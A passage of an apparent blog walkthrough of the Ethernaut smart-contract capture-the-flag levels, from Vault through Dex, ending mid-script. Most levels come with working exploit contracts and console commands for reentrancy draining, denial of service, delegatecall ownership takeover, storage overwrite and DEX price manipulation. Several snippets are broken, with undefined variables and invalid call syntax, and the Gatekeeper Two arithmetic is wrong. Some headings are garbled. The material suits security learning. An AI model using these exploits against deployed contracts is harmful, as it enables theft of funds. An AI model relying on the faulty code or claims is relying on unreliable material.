storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/e9446fa1dc73bdd6238eccf71218b163311ff773cb9ef02980f39ab6443d8e0a_auuwqt.png)  \n![Vault method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/109330cb4bbe2a93530a4c5a6bda285a392f0d2878464d1a581cc5b240a4a3ee_somrgz.png)  \n\nThe private keyword of solidity is quite tricky. Private variables limit their scopes to the contract so they can't be viewed or accessed by other **contracts** logic. However anyone can view the variable values. This challenge is simple and all we have to understand is the storage is a key value store where the keys are from 0 to 2^256.\n\nHere we can see got two storage variables `locked` and `password`. I highly encouraging reading the docs [Storage solidity Docs](https://docs.soliditylang.org/en/develop/internals/layout_in_storage.html?highlight=storage) to understand how these variables are layed out.\n\nbytes32 will take a whole slot so it can share the slot with locked. We will have then :\n\n*slot0*  `locked`\n*solt1*  `password`\n\n-----\n**Exploitation**\n\n```js\n const password = await web3.eth.getStorageAt(address, 1);\n await contract.unlock()\n```\n\nChallenge solved ✅\n\n## King\n\n**Challenge description**\n\nWhen you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.\n\n--------\n**Analysis**\n\n![King method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138016/26bbecde7b1eacd1313c83ad3cd9b8dc4aa55e3dacc9e5acf006ef155bcbc49c_x8mhfi.png)  \n\nPretty interesting, at first sight you might find this function unbreakable ( as I did ). But then a good look to the transfer method. I was thinking in term of a user who will interact with this contract. How about another contract ?\nIf we go back to the `fallback` challenge we talked about *fallback* methods. Here when we call `transfer` a callback function of the contract to whom we are transferring funds to will be triggered.\n\n-----\n**Exploitation**\n\n1. Make our contract the king.\n2. Our contract now revert the transaction and won't step down from the throne 😈.\n\n```js\ncontract EvilContract { \n\n    function becomeKing(address victimAddress) public payable { \n        victimAddress.call{value:1000000000000000000}(\"\");\n    }\n\n    function() external payable { // fallback function definition\n        revert(\"The kingdom is mine now !\");\n    }\n}\n```\n\nChallenge solved ✅\n\n## Re-entrancy\n\n**Challenge description**\n\nThe goal of this level is for you to steal all the funds from the contract.\n\n--------\n**Analysis**\n\nA quick read about Re-entrancy attack is all we need: [HackerNoon Article](https://hackernoon.com/hack-solidity-reentrancy-attack).\n\n![Reentrancy method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138011/6b9b88336f13d99f52296f5874086643de346fe2aa6dbd66098162a244b11b6c_ztdmmm.png)  \n\nSo he is actually our balance after the call that's all we need !\n\n-----\n**Exploitation** \n\n```js\ninterface Reentrance {\n\n    function donate(address _to) external payable;\n    function withdraw(uint amount) public;\n}\n\ncontract EvilContract {\n    Reentrance victimContract;\n    address victimAddress;\n    uint donatedValue;\n\n    constructor(address _victimAddress) public payable {\n        // Set our victim contract, fund the contract.\n        victimContract = Reentrance(_victimAddress);\n        victimAddress= _victimAddress\n    }\n\n    function attack(uint _donatedValue) public {\n        victimContract.donate.value(address(this),{value:_donatedValue});\n        victimContract.withdraw(_donatedValue);\n        donatedValue=_donatedValue\n    }\n\n    function() public payable {\n        // Receiver for funds withdrawn by the attack\n            if(victimAddress.balance\u003e= donatedValue )\n            victimContract.withdraw(msg.value);\n        }\n}\n```\n\nNow we should just do some arithmetic to clear all the funds and not having to donate again and withdraw. If we have 1 ether as initial balance keep it to multipliers of 10 and so on.\n\nChallenge solved ✅\n\n## Elevator\n\n`with trust, everyone can get to the last floor`\n\n**Challenge description**\n\nThis elevator won't let you reach the top of your building. Right?\n\n--------\n**Analysis**\n\n![Elevator method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/32f18465b7eeaabaeced84613e4e573847463c7b34aefd6d467fdd9d9f04d851_rpolcp.png)  \nThis function uses the method the msg.sender to know if the floor is accessible or not. The problem here is :\n\n1. `Elevator` contract has no control over the logic of the `Building` contract.\n2. The `goTo` function is actually `public` which makes it possible to have some state changes inside it.\n\nAnd all we need is to make the isLastFloor function returns false at first so we get inside the if block and true to set top.\n\n-----\n**Exploitation**\n\n```js\ninterface Elevator { \n function goTo(uint _floor) external;\n}\n\ncontract EvilBuilding { \n    uint count= 0; \n    function isLastFloor(uint) external returns (bool){ \n        count ++ ; \n        return count%2==0 ? true : false; // The first time will pass false the second true\n    }\n\n    function callAttack(address ElevatorAddress) public {\n        Elevator elevatorContract = Elevator(ElevatorAddress);\n        elevator.goTo(10); // put any number here really\n    }\n}\n```\n\nChallenge solved ✅\n\n## Privacy\n\n**Challenge description**\n\nThe creator of this contract was careful enough to protect the sensitive areas of its storage.\nUnlock this contract to beat the level.\n\n--------\n**Analysis**\n\n![Privacy storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ff541ef577bf0b185d9bd2266bc82b7cef5b80e9c30195d89a0ba04fb1f9e21e_sfqspe.png)  \n\nAs we said before, every variable in the storage can be accessed all we have to do is find which slot it's residing in. Same applies here.\n\nWe got the following:\n\n```js\n// [0] bool locked\n// [1] uint256 ID\n// [2]      awkwardness | denomination | flattening\n// arrays start always in a new slot \n// [3] bytes32 data[0]\n// [4] bytes32 data[1]\n// [5] bytes32 data[2]\n```\n\n-----\n**Exploitation**\n\nWe know the position of the password . We can unlock the contract. \n\n```js\nawait contract.getStorageAt(INSTANCE_ADDRESS,5);\n/// We can manually extract the least significant 16 bytes or simply write a util contract like below\n```\n\n```js\ncontract Utils { \n    function get16Bytes(bytes32 value) public returns (bytes16) {\n        return bytes16(value);\n    }\n}\n```\n\n```js\nawait contract.unlock(Returned_Value);\n```\n\nChallenge solved ✅\n\n## Gatekeeper One\n\nThis challenge gave me hard time, two days to solve it but I learnt a lot during those days.\n\n**Challenge description**\n\nMake it past the gatekeeper and register as an entrant to pass this level.\n\n--------\n**Analysis**\n\nOkay so we got three modifiers, each one represents a `barrier` we need to break through. I will be going through each modifier one by one.\n\n#### gateOne\n\nLooking to this gate it sounds really familiar\n\n![GatekeeperOne gateOne](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/06809c8478417e00449644e9239e81acbb43073a701381acb4adf9097c50552e_eyyyd2.png)  \n\nIt implies that we should be using another contract to interact with the gate.\n\n#### gateThree\n\nI will leave gateTwo the last one as it's the most annoying ( not hard ) one to pass.\n\n![GatekeeperOne gateOne](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/556142b2c2f87864fc6a219ce8393b52105c58b94b119105918d8c8c543abd1a_bg3gdk.png)  \n\nWe got three conditions to pass and lot of type conversion 🙂.It's time we learn how conversions works in solidity [Solidity Type conversions](https://docs.soliditylang.org/en/v0.6.0/types.html?highlight=conversions#explicit-conversions)\n\nLet's go through each condition one by one\n\n1. First condition\n\n```js\nrequire(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n```\n\nLet's say uint64(_gateKey) = 0x???????????????? and now we neeed to find the bytes we have \n\n*uint16 == uint32* which translates to 0x0000AAAA== 0xAAAA. =\u003e uint64(_gateKey) = 0x????????0000AAAA\n\n2. Second Condition\n\n```js\nrequire(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n```\n\n**uint32 != uint64 `` which translated to 0x????????0000AAAA != 0x0000AAAA ( the value we found in condition 1 ) so here we need make sure the `?` are different than zeros.\n\n3. Last condition\n\n```js\nrequire(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\");\n```\n\nIt just tells us that the `AAAAA` should be derived from the `tx.origin` value.\n\nOkay to sum it up we have the format of `0xFFFFFFFF0000FFFF` for our contract. so we can get the values by using a logical operator `\u0026`.\n\n#### gateTwo\n\n![Gateekeeper gateTwo](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ed529917c8ae75cb2c5878f6bd67665021b8843e8d04305cf5556944dd3a45bf_f9rwex.png)  \n\nwhat is the `gasleft` function ?\nthe gasleft function tells us how much gas is left. As we know each transaction needs a certain amount of gas that we pay for. But do you know how the amount of gas if calculated ?\nwe can check the website [Opcodes, EVM](https://www.ethervm.io/), actually each opcode has its fixed consumption of gas. We are here determined to get the value of the gasleft when we arrive at the condition and make sure it can be divided by that number.\n\n-----\n\n**Exploitation**\n\n1. We should call the contract from our `Evil Contract` so we bypass the first gate\n2. We should make sure the key adhere to the key format we found.\n3. We need to pass a gas value that passes the condition.\n    \u003e However when searching for that gas value we can\n        1. Calculate the gas consumed till the call of the condition check by using the debugger by summing the cost of opcodes :)\n        2. Use the debugger to check the gas value at the condition check.\n        3. Just don't, if you are impatient brute force it. That's what I did when I got low on caffeine and the music stopped.\n\n![Debugging interface](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/18f23b5aad25da24fa6fbdc8842fb1ee0568daa3ac723a166802b0cc2dd2518d_yg3ech.png)  \n\nSo here is the final contract\n\n```js\ncontract EvilContract { \n    function getKey() view public returns (bytes8){ \n        return bytes8(uint64(uint160(tx.origin))) \u0026 0xFFFFFFFF0000FFFF; // The first time will pass false the second true\n    }\n    function callAttack(address gateAddress, uint baseGasValue) public returns (bool) {\n        bytes8 gateKey = getKey();\n        uint i;\n\n        for (i=0;i\u003c300;i++)\n        {\n        (bool result,) =  gateAddress.call{gas:gasValue}(abi.encodeWithSignature(\"enter(bytes8)\", baseGasValue+100+8191*4));\n        if(result) return result;\n        }\n        return false;\n    }\n}\n```\n\nHappy hacking ! You may rest traveler , The next gate will be some kind of a boss fight.\n\nChallenge solved ✅\n\n## GateKeeper Two\n\n\u003e Time to delve deep in the ethereum blockchain\n\n**Challenge description**\n\nI will sum up we need to pass the gate and learn many things.\n\n--------\n**Analysis**\n\nAs usual here we got three modifiers to pass. We will be going through each modifer one by one from the easiest to the hardest.\n\n![Gatekeeper contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/193982e4a19ec767e0759ab2e9adc2e16865502b0625e6eb22fc0a39e11418d7_k0ahq6.png)  \n\n#### GateOne\n\n```js\nmodifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n```\n\nOkay we need to call the `GatekeeperTwo` from another contract.\n\n#### GateTwo\n\n```js\nmodifier gateTwo() {\n    uint x;\n    assembly { x := extcodesize(caller()) }\n    require(x == 0);\n    _;\n  }\n```\n\nOww a new keyword `assembly` what's that ? \n![Solidity Documentation Screenshot - assembly keyword](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/2cb6f44375d3fb1a39d4e147414218e8f9d1b7fe5a98c873c4469082b7fba674_qlucds.png)  \n\nSo we have now a clear idea of the assembly keyowrd and it's capabilities, that might remind you a little bit of how the `C` language works ! \nFor the `extcodesize` the code snippet below taken from the docs explains it all.\n\n```js\n// retrieve the size of the code, this needs assembly\n            let size := extcodesize(addr)\n```\n\nFor the `caller()` it returns the address of the caller. it might be an account or another contract. Actually, this `consensys` which a great resource for smart contract security explains it all .\n\n\u003e the idea is straightforward: if an address contains code, it's not an EOA but a contract account. However, a contract does not have source code available during construction. This means that while the constructor is running, it can make calls to other contracts, but extcodesize for its address returns zero.\n\n[Consensys Page](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)\n\nSo we now know to pass this gate we need to call the method `enter` in the constructor of our *EvilContract*\n\n### gateThree\n\nThis gate resembles gateThree of *GateKeeper One* it's about performing the right logical operations and finding the gateKey.\n\n```js\n modifier gateThree(bytes8 _gateKey) {\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);\n    _;\n  }\n```\n\nLet's evalulate the *right* side of the equality. Remember the *Token* Challenge ? yes but now this dangerous manipulation of unsigned integer in intended and it gives us the value `0xFFFFFFFF`.\nFor the *left* side of the equality we got an **XOR** operation. **XOR** verifies if the bits in the same position or not if they are it results in 1 otherwise in 0. Let's ignore the conversion it won't change anything actually because we can reverse it to get the _gateKey later.\n\nSo the equation we have : \n\n**A** =  `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`\n**B** = `uint64(_gateKey)`\n**C** = `uint64(0) - 1`\n\nHere is what we need to do ! Read carefully this wikipedia page if you need to understand how it works on bit level. [Wikipidea XOR Article](https://en.wikipedia.org/wiki/XOR_cipher)\n![XOR Wikipedia Screenshot](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/01a9f0d0791a8896c4b6109abc576acbfbccade8b44817fa1abd2f245eb99700_lii5bn.png)  \n\n`A ^ B = C , B = ? ==\u003e B = A ^ C`\nWhich translates to\n`gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1);`\n\n-----\n**Exploitation**\n\nLet's craft our *EvilContract*\n\n```js\ncontract EvilContract { \n\n    function getOperationResult() public pure returns (uint64){\n        uint64 x =0; \n        return x - 1;\n    }\n\n   function getGateKey() public view returns (bytes8){ \n       uint64 x = getOperationResult();\n     return   bytes8(x ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));\n   }\n\n   \n   constructor(address gateAddress) public {\n       GateTwo gateTwoContract= GateTwo(gateAddress);\n       bytes8  gateKey =getGateKey();\n      bool state= gateTwoContract.enter(gateKey);\n     require(state);\n   }\n   \n}\n```\n\nWe pass our instance address to the constructor.\n\nChallenge solved ✅\n\n\u003e I was late, I couldn't join theCyber club 🥲\n\n## Naught Coin\n\n\u003e RTFM\n\n**Challenge description**\n\nNaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.\n~ A bunch of useful references we will be going through in analysis\n\n--------\n\n**Analysis**\n\n![Naught Coin contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/264f925aeaf5e08d9758746a1f9774a6a2194df257f8dd0a92a00b4b820881d7_dm5hut.png)  \n\nThe contract is an implementation of the ERC20 specification.\n\n*How it works ?*\nWe create tokens that can be traded between the users of our contract. Our contract is responsible for setting the total supply and modifying it, keeping track of users balance and one other useful feature allowing and disallowing the ones who can spend/trade tokens from each account remember that it will be useful.\n\nThe logic is flawless and the condition cannot be bypassed.\n\n```js\n      require(now \u003e timeLock);\n```\n\nBut our contract is inheriting from the ERC20 of openzeppelin and we can see something is wrong.\n\n![ERC20 openzeppeling](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/1ec4088e0ffadccfa057b1c022c8d4fb51d1475ef0e0018a4e32b7b1beab92e0_iagggl.png)  \n\nWe got another method for transferring tokens ! cool but wait *he caller must have allowance for ``from``'s tokens of at least amount* so msg.sender needs to have an allowance of the amount.\nand allowance can be set by calling..\n\n![ERC20 openzeppelin](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/47b72aa9c7060cd02c197e1de9e50fb4f53f3b5a7d7e6e9f0c946807ec700df9_gsugja.png)  \n\nOkay we got everything let's -----\n**Exploitation** it\n\n**Further Reading** [ERC20 API: An Attack Vector on Approve/TransferFrom Methods](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit#)\n\n-----\n**Exploitation**\n\n```js\nconst balance = (await contract.balanceOf(player)).toString();\nawait contract.approve(player,balance);\nawait contract.transferFrom(player,ANY_OTHER_ADDRESS,balance);\n```\n\nChallenge solved ✅\n\n## Perservation\n\n**Challenge description**\n\nThis contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.\nThe goal of this level is for you to claim ownership of the instance you are given.\n\n--------\n**Analysis**\n\nI explained well the `delegateCall` function before and how it runs in the caller context but I left the context a little blurry so let's define it.\nThe context here is the storage variables or let me call them `state variables` they are defined in the contract address and the called contract will handle them *blindly* which means he will assume that\n\n*Storage layout of the caller*  == *Storage layout of the callee*\n\nLet's look to our contract now.\n\n![Perservation contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/0cded2638e39c98dee9e35690675e5a299c3628f81c9bdb1375a708b5e209098_ecu1g4.png)  \n\nThe interesting bits are : \n\n```js\n  //inside the library contract\n  uint storedTime;  \n\n   function setTime(uint _time) public {\n    storedTime = _time;\n  }\n```\n\n```js\n // inside the vulnerable contract\n address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner; \n  uint storedTime;\n```\n\nI guess you got an idea what will happens with the delegateCall ? `storedTime` is actually our `timeZone1Library` variable they are both at `slot[0]` of the storage so it will be set instead. \nand the `setSecondTime` does the same thing as the `setFirstTime` in this case.\n\n-----\n**Exploitation**\n\n1. Create an evil contract that implements `setTime(uint)` and has the same storage layout as the vulnerable contract ( by declaring the same variables in the same order 😄)\n2. call the `set_X_Time` of the vulnerable contract by passing uint(evilcontractAddress) as paramater\n3. call the method again now our evilContract function will be triggered to set owner = ourAccount;\n\nLet's craft the *EvilContract*\n\n```js\ncontract EvilContract {\n\n  address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner; \n  \n  // These variable are useless because we won't to ensure that the owner is in slot[2] \n  // we don't really care about the slots that comes after\n  uint storedTime;\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n   function setTime(uint _time) public {\n    owner = 0x84e7a3679A82C2766Ff8382862ab883FF9460307;\n   }\n\n   function getParam() view public returns (uint){\n        return uint(address(this));\n   }\n}\n```\n\nChallenge solved ✅\n\n**Further Reading** [Preventing Smart Contract Attacks on Ethereum — “DELEGATECALL”](https://betterprogramming.pub/preventing-smart-contract-attacks-on-ethereum-delegatecall-e864d0042188)\n\n## Recovery\n\n\u003e Forensics in the blockchain world !\n\n**Challenge description**\n\nA contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.\n\nThis level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.\n\n--------\n**Analysis**\n\n**the problem**\n\n```js\n    new SimpleToken(_name, msg.sender, _initialSupply);\n```\n\n\u003e A contract can create other contracts using the new keyword. The full code of the contract being created has to be known when the creating contract is compiled so recursive creation-dependencies are not possible.\n\n[Solidity Docs - New keyword](https://docs.soliditylang.org/en/v0.8.15/control-structures.html?highlight=new%20keyword#creating-contracts-via-new)\n\nthe `new` keyword returns the address of the created contract but here it's not saved and there is no way to retrieve it from the contract state. But we are in the blockchain world where transparency rules ! All transactions are saved and we can actually find the created contract.\n\n-----\n**Exploitation**\n\n1. Go to [Etherscan](https://rinkeby.etherscan.io/)\n2. Search for your instance address\n3. You will find something similar to this, click it !\n![Recovery instance contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/93668187b141f813b187b92cf0e33ff963269e40cd11b36386300e201af120c9_atmryc.png)  \n\n4. Check the balance to be sure that it's the created contract.\n\n ![Recovery created contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/106328b15039a3d164b45720563251c6f628e2907732a9b997514327aac3f457_vnq6mh.png)  \n\n6. call the destroy function with your wallet address as paramater\n\nHere is a simple contract to call the destroy function :\n\n```js\ninterface SimpleToken {\n      function destroy(address payable _to) external ; \n}\n\ncontract Recover {\n\n    function recoverFunds(address contractAddress, address payable myAddress) public {\n        //  (bool success, ) = contractAddress.call(\n        //     abi.encodeWithSignature(\"destroy(address payable)\", myAddress));\n        //  require(success);   \n\n        // or a cleaner way \n        SimpleToken tokenContract = SimpleToken(contractAddress);\n        tokenContract.destroy(myAddress);\n    }\n\n    function verifyBalance(address contractAddress) public view returns (uint){\n        return contractAddress.balance;\n    }\n}\n```\n\n## Magic Number\n\n**Challenge description**\n\n\u003e To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.\nEasy right? Well... there's a catch.\nThe solver's code needs to be really tiny. Really reaaaaaallly tiny. Like freakin' really really itty-bitty tiny: 10 opcodes at most.\n\n--------\n**Analysis** \n\nWriting Opcode instead of plain solidity.  **It's not that hard right ?** *right?* \nOkay Let's dive in one by one till we understand how everything works. I  will be writing some pseudo/solidity code for analogy.\n\n```js\n//\nfunction whatIsTheMeaningOfLife(){\n    return 42;\n}\n\n```\n\n`a contract that responds to whatIsTheMeaningOfLife()` fallback function can answer that so let's make things more simple\n\n```js\nfunction(){\n    return 42;\n}\n```\n\nLet's translate it line by line to opcode. I found this magnificent reference [EtherVM](https://www.ethervm.io/#02). I really like the table view instead of navigating page by page through the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf).\n\n```js\nreturn 42; \n---------   \nPUSH1 0x42 //  our value\nPUSH1 0x80 //  memory position\nMSTORE // stores the 42 into memory location 0x80\nPUSH1 0x20 // the length of the value\nPUSH1 0x80 // memory position ( again )\nRETURN // returns (memory position , offset )  so we can calculate memoryPos+offset to get the value !\n\n// *10 bytes total*\n```\n\n`PUSH1 VALUE` pushes a 1-byte value onto the stack.\n`MSTORE` writes a (u)int256 to memory takes (offset,value) as args\n\n\u003e The ethereum evm is a [Stack Machine](https://en.wikipedia.org/wiki/Stack_machine). args comes from the stack and return values are written into the stack.\n\n\u003e In fact, Solidity uses the memory area between address zero and address 0x7F for internal purposes, and stores data starting at address 0x80. So initially, free memory starts at 0x80. To keep track of which memory can still be used and which memory areas are already in use [A deep-dive into Solidity – contract creation and the init code](https://leftasexercise.com/2021/09/05/a-deep-dive-into-solidity-contract-creation-and-the-init-code/)\n\nNow we have to write opcodes for contract initialization. We should know how contract initialization works under the hood. First the bytes sent in the transaction can be divided into two *initialization opcodes* and *runtime opcodes*. The *initialization opcodes* are the one responsible for the creation of the contract by executing the constructor and copying the *runtime opcodes* into the memory because the *runtime opcodes* is the instruction that will be run in the contract (functions,modifiers etc). What we have defined above is the *runtime opcodes*. Let's define our *initilization opcodes*\n\n```js\n// copy the runtime code into memory with codecopy(length,offset,dest)\nPUSH 0x0a // 10 bytes of runtime opcodes\nPUSH 0x0c // 13 bytes of initialization opcodes ( I didn't guess it I have actually calculated after writing the whole thing )\nPUSH 0x00 // memory offset\nCODECOPY\n\n// the initialization will stop at STOP or RETURN. for our case I will return the offset + length of the runtime code\nPUSH 0x0a \nPUSH 0x00\nRETURN\n```\n\n-----\n**Exploitation**\n\nTo craft our payload we will convert the instruction to pure bytes. That's fairly easy. We view [EtherVM](https://www.ethervm.io/#02) to view the bytes of each instruction and for the values we discard the `0x` (`0x0a` =\u003e `0a`)\n\n                       [ Initialization bytes    |    Runtime bytes ]\nSo our final payload : `600a600c600039600a6000f3604260805260206080f3`\n\nWe open the console to create our contract and set it as the solver.\n\n```js\nconst tx = await web3.eth.sendTransaction({from:player,data:'600a600c600039600a6000f3604260805260206080f3'});\nawait contract.setSolver(tx.contractAddress);\n```\n\nChallenge solved ✅\n\n## Alien Codex\n\n**Challenge description**\n\nYou've uncovered an Alien contract. Claim ownership to complete the level.\n\n    Understanding how array storage works\n    Understanding ABI specifications\n    Using a very underhanded approach\n\n--------\n**Analysis**\n\nFirst look at the contract code nothing comes to my mind. The Ownable contract is actually `openzeppelin` Ownable and I looked into its source code and the only useful thing I got is it saves `address owner`.\n\n Looking back to the challenge description I noticed the array in storage part. Dynamic structures have a length property that takes a normal position in the stack and from it we can look for the array data in the stack. We have to use `keccack265(length_position)` to find the first slot of array data.\n\nSo how can we -----\n**Exploitation** that ?\n\n![Alien Codex method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/86f1f291d81ff664dbe3c9afd11c315bb31de2e0a3283a0f8d964b43e9bf44eb_tcxxpp.png)  \n\nWe got 2 slots taken from the whole storage. If we make the length of the array takes up the whole storage then we can overwrite any value of it. `retract` allows that, the `array.length` is `uint256`. \n\nAfter taking up the whole storage we need to find the position of the owner variable.\nOur current storage layout is.\n\n```js\n/* STORAGE\n* [0]: contract + owner , \n* [1]: codex\n* keccak256(1) : codex[0]\n*       ..\n*        ..\n* [2^256]: 0x000000000\n*/\n```\n\nWe want to overlap and get to slot[0] to set it. We can calculate the index of that element by `2^256 - keccack(256)(1) +1`\n\n-----\n**Exploitation**\n\nfirst we call the `retract` to set the array length to max.\n\n```js\nawait contract.retract()\n```\n\nthen we get our payload, here is a utils contract.\n\n```js\ncontract Utils { \n\n    function getNumber() public pure returns (uint256){\n      uint256 x =0;\n        \n        // return x-1 - uint256(keccak256(abi.encodePacked(uint256(1))))+1;\n        \n        return x - uint256(keccak256(abi.encodePacked(uint256(1))));\n    }\n}\n```\n\nWe check if we got it right 😄\n\n![Alien Codex - check](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/03ed7019523687b6195b1e2824212ccf9c27300ff053773c2f5b93ea5b79580d_boj4jy.png)  \n\nno need to be puzzled we know what it is it's the contact value + \n\n![Alien Codex - Level address](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138013/9faab8cbd57b86461622fa7e3aad8dab64aed6c6d4a52a4ee19088857b840d21_pzx1am.png)  \n\nSo our payload should be \n\n```Js\n0x00000000000000000000000184e7a3679A82C2766Ff8382862ab883FF9460307\n0x000000000000000000000001YOUR_ADDRESS_HERE\n```\n\nChallenge solved ✅\n\n## Denial\n\n\u003e There is a way to using `addr.call{value:x}(\"\")`, only that it forwards all remaining gas and opens up the ability to perform more expensive actions ( and it returns a failure code instead of propagating the error )  ~ Solidity docs\n\nThat's all we need. So I lost quite bit of time looking for a way to reach the call stack depth limit ( which is 1024 ). But it was more the hard way of doing things.  What if we didn't leave the caller contract enough gas to transfer the 1% of the owner ? Yes that's really it !\n\n-----\n**-----\n**Exploitation**ation**\n\nOur evil contract, btw don't try to run it on Remix as it will crash instead use truffle console or something similar to try it \n\n```js\ncontract EvilContract { \n    receive() external payable {\n        while(true);  // the line that crashed my whole VM\n    }\n}\n```\n\nChallenge solved ✅\n \n \u003e This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.\nIf you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().\n\nTypically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.\n\nNote: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.\n\n\n## Shop\n\n```js\ninterface Shop {\n\n  function buy()  external ;\n  function isSold()  external view returns (bool) ;\n  }\n\ncontract EvilContract { \n    address victimAddress;\n    Shop shopContract;\n\n    function setVictimAddress( address _victimAddress) public { \n        victimAddress= _victimAddress;\n        shopContract = Shop(_victimAddress);\n    }\n\n    function price() external view returns (uint){\n        return shopContract.isSold()?0:100;\n    }\n\n    function buy() public {\n        shopContract.buy();\n    }\n}\n```\n\n## Dex\n\n`This challenge and it's second version will have the same solution basically with a little tweak. Better understand the concept`\n\n**Challenge description**\n\n\u003eThe goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.\nYou will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.\nYou will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a \"bad\" price of the assets.\n\n--------\n**Analysis**\n\nThe logic is faultless or is it ?  Well to be honest had to try many things here. One thing that got my attention that the equation made to calculate the swap_amount was familiar but not that much\n\n![Dex Equation](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138013/17dcc969cfc52464829cb1a88231824931fda3a5b0d0b1d3d446eaf763974942_xxpfji.png)\n\nA good read to understand it [Amazing Article to understand AMM](https://www.gemini.com/cryptopedia/amm-what-are-automated-market-makers).\n\nSo actually by balancing our token balance from one token to another we will manage at last to drain the contract's balance of one token's type.\n\n-----\n**-----\n**Exploitation**ation**\n\n```js\nconst contractABI = artifacts.require(\"Dex\");\n\n// if token1.balance \u003e token2.balance ==\u003e token2 is more expensive because it has less tokens\n// we want to trade the most expensive tokens\n// knowTokenValues() ==\u003e Distiniguishing the most expensive and cheapest token\n// getSwapValues() // Basically our balance in the most expensive token\n// ==============================\n\nlet contract ;\nconst TOKEN1_ADDRESS = \"0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7\";\nconst TOKEN2_ADDRESS = \"0xE651aD37ac31B03F7B49036248A29DC75D0093E6\";\nlet PLAYER='PLAYER_ADDRESS'\n\nasync function getBalances(){\n    const token1Balance = (await contract.balanceOf(TOKEN1_ADDRESS,contract.address)).toNumber();\n    const token2Balance = (await contract.balanceOf(TOKEN2_ADDRESS,contract.address)).toNumber();\n    console.log(`Current Balances for contract : A : ${token1Balance} \\t B : ${token2Balance}`);\n    return {token1Balance,token2Balance}\n}\n\n function knowTokenValues({token1Balance,token2Balance}){\n    return {mostExpensiveToken: token1Balance \u003e= token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS,cheapestToken:token1Balance \u003c token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS };\n}\n\nasync function getSwapValues(tokensWithValues){\n    let toSwap  = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,PLAYER)).toNumber();\n    let available = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,contract.address)).toNumber();\n\n    // to be able to drain the funds and not stop when we got too much tokens.\n    if(toSwap\u003eavailable)toSwap=available;\n\n    return toSwap;\n}\n\n\nasync function drainFunds(){\n    \n    let flag=true; // check condition\n\n    // approving otherwise you will get an error due to how ERC20 works.\n    await contract.approve(contract.address,10000,{from:PLAYER});\n\n    while(flag){\n        const balances = await getBalances();\n        const tokenValues =  knowTokenValues(balances);\n        const toSwap = await getSwapValues(tokenValues);\n        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});\n        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);\n\n        flag = 